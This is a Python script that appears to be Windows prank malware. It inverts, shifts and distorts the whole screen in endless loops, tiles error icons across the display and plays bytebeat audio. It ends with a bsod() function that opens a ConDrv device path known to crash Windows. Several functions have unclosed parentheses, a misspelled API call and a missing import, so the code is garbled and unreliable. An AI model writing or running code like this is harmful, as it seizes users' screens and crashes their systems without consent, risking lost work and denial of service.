import win32gui
import win32api
import win32con 
import ctypes
import random
import math
import time
from ByteBeat import *

def change_background():
  background_path = "images.jpeg"
  ctypes.windll.user32.systemParameterInfoW(20, 0, background_path, 0)

def playload_01():
  user32 = ctypes.windll.user32
  user32.SetProcessDPIAware()
  [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
  hdc = win32gui.GetDC(0)

  while True:
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3,-3, win32con.NOTSRCCOPY)
    ByteBeat.play(
      '( ( t & ( ( t >> 18 ) + ( ( t >> 11 ) & t ) ) ) * t + ( ( ( t >> 8 & t ) - ( t >> 3 & t >> 8 | t >> 16 ) ) & 128 ) )', # The mathematical input, as a string.
      10,         # The amount of seconds to play.
      8000,       # KiloHertz (kHz) for the ByteBeat.
      True        # Wait until the ByteBeat finished or not.
    )

def playload_02():
  hdc = win32gui.GetDC(0)
  user32 = ctypes.windll.user32
  user32.SetProcessDPIAware()
  [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

  x = y = 0
  while True:
      win32gui.DrawIcon(hdc, x , y , win32gui.LoadIcon(None, win32con.IDI_ERROR)) # Change IDI_ERROR to something else to change the icon being displayed
      x = x + 30
      if x >= w:
        y = y + 30
        x = 0
      if y >= h:
        x = y = 0
      ByteBeat.play(
        'speed=2,length=256,t*1.0594630943592953**[0,,0,,12,,0,,0,,17,,0,,0,,14,,0,,0,,10,,0,,0,,12,,0,,0,,0,,15,12,7,3,0,,0,,14,12,7,3,0,,0,,12,7,3,0,-12,,0,,15,12,7,3,-4,,-4,,12,,-4,,-4,,15,,-4,,-4,,14,,-4,,-4,,10,,-4,,-4,,12,,-4,,-4,,-4,,12,,-4,,-4,,15,,-4,,-4,,14,,-4,,-4,,10,,-4,,-4,,12,,-4,,-16,,-16,,12,,-16,,-16,,12,,-16,,-17,,14,,-16,,-16,,10,,-16,,-16,,12,,-16,,-16,,-4,,15,12,7,3,-16,,-16,,14,12,7,3,-4,,-4,,12,7,3,-16,-12,,-16,,15,12,7,3,-19,,-19,,12,,-19,,-19,,15,,-19,,-19,,14,,-19,,-19,,10,,-19,,-19,,12,,-19,,-19,,-19,,12,,-19,,-19,,15,,-19,,-19,,14,,-19,,-19,,10,,-19,,-19,,12,,-19,,][int(t*speed/4096)%length]-1|t>>5', # The mathematical input, as a string.
        10,         # The amount of seconds to play.
        44,       # KiloHertz (kHz) for the ByteBeat.
        True        # Wait until the ByteBeat finished or not.
      )

def playload_03():
  user32 = ctypes.windll.user32
  user32.SetProcessDPIAware()
  [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
  hdc = win32gui.GetDC(0)

  while True:
    ByteBeat.play(
      't/256*(t&t>>12)',
      '44',
      'true'
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3,-3, win32con.NOTSRCCOPY

def playload_04():
  def sines():
    desktop = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(desktop)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    angle = 0

    while True:
        ByteBeat.play(
          '((9*t&t>>4|5*t&t>>7|3*t&t>>10)-1)',
          '8000',
        hdc = win32gui.GetWindowDC(desktop)
        for i in range(int(sw + sh)):
            a = int(math.sin(angle) * 20)
            win32gui.BitBlt(hdc, 0, i, sw, 1, hdc, a, i, win32con.SRCCOPY)
            angle += math.pi / 40
        win32gui.ReleaseDC(desktop, hdc)
        time.sleep(0.01)

  if __name__ == '__main__':
      sines()
def bsod():
  os.system("//./GLOBALROOT/Device/Condrv/KernelConnect")
  
